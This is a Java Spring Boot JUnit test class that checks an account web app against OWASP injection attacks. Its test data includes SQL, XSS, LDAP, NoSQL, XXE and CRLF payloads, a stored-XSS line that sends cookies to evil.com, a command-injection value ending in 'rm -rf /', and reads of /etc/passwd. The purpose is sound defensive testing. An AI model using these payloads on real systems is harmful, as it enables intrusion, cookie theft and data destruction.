package com.visualpathit.account.securityTest;

import com.visualpathit.account.model.User;
import com.visualpathit.account.service.UserService;
import com.visualpathit.account.validator.UserValidator;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.validation.BeanPropertyBindingResult;
import org.springframework.validation.Errors;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * DEVSECOPS SECURITY TESTS
 * Tests protection against injection attacks
 *
 * OWASP Top 10 Coverage:
 * - A03:2021 - Injection (SQL Injection, XSS, Command Injection)
 * - A04:2021 - Insecure Design
 */
@SpringBootTest
@AutoConfigureMockMvc
@Transactional
@TestPropertySource(properties = {
    "spring.datasource.url=jdbc:h2:mem:injectiontestdb",
    "spring.jpa.hibernate.ddl-auto=create-drop"
})
@DisplayName("🛡️ Injection Security Tests (DevSecOps)")
class InjectionSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired(required = false)
    private UserService userService;

    @Autowired(required = false)
    private UserValidator userValidator;

    // ========== A03:2021 - SQL Injection Protection ==========

    @Test
    @DisplayName("🛡️ Should prevent SQL injection in username field")
    void testSqlInjectionInUsername() {
        if (userService == null) {
            return;
        }

        // Given - SQL injection attempt
        String sqlInjectionUsername = "admin' OR '1'='1";

        // When
        User result = userService.findByUsername(sqlInjectionUsername);

        // Then - Should not find user (query is parameterized)
        assertNull(result, "SQL injection should not bypass authentication");
    }

    @Test
    @DisplayName("🛡️ Should prevent SQL injection in login form")
    void testSqlInjectionInLoginForm() throws Exception {
        // Attempt SQL injection in username field
        mockMvc.perform(post("/login")
                        .param("username", "admin' OR '1'='1' --")
                        .param("password", "anything")
                        .with(csrf()))
                .andExpect(status().is3xxRedirection())
                .andExpect(redirectedUrl("/login?error"));
    }

    @Test
    @DisplayName("🛡️ Should use parameterized queries (JPA protection)")
    void testParameterizedQueries() {
        if (userService == null) {
            return;
        }

        // Test various SQL injection payloads
        String[] injectionPayloads = {
            "admin'--",
            "admin' #",
            "admin' /*",
            "' or 1=1--",
            "' or 'a'='a",
            "'; DROP TABLE users--",
            "1' UNION SELECT NULL--",
            "admin' AND '1'='1"
        };

        for (String payload : injectionPayloads) {
            User result = userService.findByUsername(payload);
            assertNull(result,
                    "SQL injection payload should not return results: " + payload);
        }
    }

    // ========== A03:2021 - Cross-Site Scripting (XSS) Protection ==========

    @Test
    @DisplayName("🛡️ Should sanitize/escape XSS in username during registration")
    void testXssInUsername() throws Exception {
        // Attempt XSS injection in username
        String xssPayload = "<script>alert('XSS')</script>";

        mockMvc.perform(post("/registration")
                        .param("username", xssPayload)
                        .param("password", "password123")
                        .param("passwordConfirm", "password123")
                        .param("email", "test@example.com")
                        .with(csrf()))
                .andExpect(status().isOk())
                .andExpect(model().hasErrors()); // Should fail validation
    }

    @Test
    @DisplayName("🛡️ Should protect against XSS in post content")
    @WithMockUser(username = "testuser")
    void testXssInPostContent() throws Exception {
        String xssPayload = "<script>document.location='http://evil.com'</script>";

        mockMvc.perform(post("/timeline/post")
                        .param("content", xssPayload)
                        .with(csrf()))
                .andExpect(status().is3xxRedirection());

        // The content should be escaped when rendered in JSP
        // JSP JSTL <c:out> tag automatically escapes HTML
    }

    @Test
    @DisplayName("🛡️ Should escape HTML entities in user input")
    void testHtmlEntityEscaping() throws Exception {
        // Test various XSS vectors
        String[] xssPayloads = {
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>"
        };

        for (String payload : xssPayloads) {
            mockMvc.perform(post("/registration")
                            .param("username", "validuser12345")
                            .param("password", "password123")
                            .param("passwordConfirm", "password123")
                            .param("email", payload) // XSS in email field
                            .with(csrf()))
                    .andExpect(status().isOk()); // Should not execute script
        }
    }

    @Test
    @DisplayName("🛡️ Should prevent stored XSS attacks")
    @WithMockUser(username = "attacker")
    void testStoredXssProtection() throws Exception {
        // Attempt to store XSS payload that would execute on other users' browsers
        String storedXssPayload = "<img src=x onerror=fetch('http://evil.com/steal?cookie='+document.cookie)>";

        mockMvc.perform(post("/profile/update")
                        .param("userProfileImageUrl", storedXssPayload)
                        .with(csrf()))
                .andExpect(status().is3xxRedirection());

        // When rendered, JSP should escape this content
    }

    @Test
    @DisplayName("🛡️ Should protect against DOM-based XSS")
    void testDomBasedXssProtection() throws Exception {
        // Test URL parameters that could be reflected in DOM
        String xssInUrl = "<script>alert(document.domain)</script>";

        mockMvc.perform(get("/search")
                        .param("q", xssInUrl))
                .andExpect(status().isOk());

        // JavaScript should not execute from URL parameter
    }

    // ========== Input Validation ==========

    @Test
    @DisplayName("🛡️ Should validate and reject malicious input patterns")
    void testMaliciousInputValidation() {
        if (userValidator == null) {
            return;
        }

        String[] maliciousInputs = {
            "../../../etc/passwd",           // Path traversal
            "$(whoami)",                      // Command injection
            "${7*7}",                         // Expression language injection
            "{{7*7}}",                        // Template injection
            "%00",                            // Null byte injection
            "..\\..\\..\\windows\\system32"   // Windows path traversal
        };

        for (String maliciousInput : maliciousInputs) {
            User user = new User();
            user.setUsername(maliciousInput);
            user.setPassword("password123");
            user.setPasswordConfirm("password123");

            Errors errors = new BeanPropertyBindingResult(user, "user");
            userValidator.validate(user, errors);

            assertTrue(errors.hasFieldErrors("username"),
                    "Should reject malicious input: " + maliciousInput);
        }
    }

    @Test
    @DisplayName("🛡️ Should enforce maximum length to prevent buffer overflow")
    void testMaximumLengthValidation() {
        if (userValidator == null) {
            return;
        }

        // Test username longer than allowed (> 32 characters)
        User user = new User();
        user.setUsername("a".repeat(100)); // Very long username
        user.setPassword("password123");
        user.setPasswordConfirm("password123");

        Errors errors = new BeanPropertyBindingResult(user, "user");
        userValidator.validate(user, errors);

        assertTrue(errors.hasFieldErrors("username"),
                "Should reject username exceeding maximum length");
    }

    @Test
    @DisplayName("🛡️ Should enforce minimum length for security fields")
    void testMinimumLengthValidation() {
        if (userValidator == null) {
            return;
        }

        // Test password shorter than minimum (< 8 characters)
        User user = new User();
        user.setUsername("validuser");
        user.setPassword("short");
        user.setPasswordConfirm("short");

        Errors errors = new BeanPropertyBindingResult(user, "user");
        userValidator.validate(user, errors);

        assertTrue(errors.hasFieldErrors("password"),
                "Should reject password below minimum length");
    }

    // ========== Command Injection Protection ==========

    @Test
    @DisplayName("🛡️ Should prevent command injection in file paths")
    void testCommandInjectionProtection() throws Exception {
        // Attempt command injection via file upload paths
        String commandInjection = "avatar.jpg; rm -rf /";

        mockMvc.perform(post("/profile/update")
                        .param("userProfileImageUrl", commandInjection)
                        .with(csrf())
                        .with(org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user("testuser")))
                .andExpect(status().is3xxRedirection());

        // Application should not execute shell commands from user input
    }

    // ========== LDAP Injection Protection ==========

    @Test
    @DisplayName("🛡️ Should prevent LDAP injection (if LDAP is used)")
    void testLdapInjectionProtection() {
        if (userService == null) {
            return;
        }

        // LDAP injection payloads
        String[] ldapPayloads = {
            "admin)(&",
            "*)(uid=*",
            "admin)(|(password=*))"
        };

        for (String payload : ldapPayloads) {
            User result = userService.findByUsername(payload);
            assertNull(result,
                    "LDAP injection should not bypass authentication: " + payload);
        }
    }

    // ========== XML Injection Protection ==========

    @Test
    @DisplayName("🛡️ Should prevent XXE (XML External Entity) attacks")
    void testXxeProtection() throws Exception {
        // XXE payload
        String xxePayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>";

        mockMvc.perform(post("/api/import")
                        .contentType("application/xml")
                        .content(xxePayload)
                        .with(csrf())
                        .with(org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user("testuser")))
                .andExpect(status().is4xxClientError()); // Should reject or not process
    }

    // ========== NoSQL Injection Protection ==========

    @Test
    @DisplayName("🛡️ Should prevent NoSQL injection (if NoSQL is used)")
    void testNoSqlInjectionProtection() {
        if (userService == null) {
            return;
        }

        // NoSQL injection payloads (MongoDB example)
        String[] noSqlPayloads = {
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "'; return true; var dummy='",
            "1'; return true; var dum='1"
        };

        for (String payload : noSqlPayloads) {
            User result = userService.findByUsername(payload);
            assertNull(result,
                    "NoSQL injection should not bypass authentication: " + payload);
        }
    }

    // ========== Header Injection Protection ==========

    @Test
    @DisplayName("🛡️ Should prevent HTTP header injection")
    void testHttpHeaderInjection() throws Exception {
        // Attempt to inject headers via CRLF injection
        String crlfInjection = "testuser\r\nSet-Cookie: sessionid=malicious";

        mockMvc.perform(get("/profile")
                        .header("X-Username", crlfInjection)
                        .with(org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user("testuser")))
                .andExpect(status().isOk())
                .andExpect(header().doesNotExist("Set-Cookie")); // Should not inject cookie
    }
}
